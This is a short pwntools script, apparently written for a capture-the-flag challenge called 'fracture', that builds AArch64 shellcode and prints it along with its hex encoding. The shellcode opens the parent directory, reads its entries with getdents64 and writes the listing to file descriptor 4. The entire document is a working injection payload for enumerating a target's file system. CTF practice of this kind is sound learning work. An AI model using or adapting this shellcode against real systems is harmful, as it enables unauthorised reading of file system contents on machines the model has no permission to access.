from pwn import *

context.binary = ELF("/home/kali/cybertalent/fracture")

shellcode =  shellcraft.open("..")
shellcode += shellcraft.getdents64("x0", "sp", 0x321)
shellcode += shellcraft.write(0x4, "sp", 0x321)
shellcode += """
    eor x0, x0, x0
    ret
"""

print(shellcode)
print(enhex(asm(shellcode)))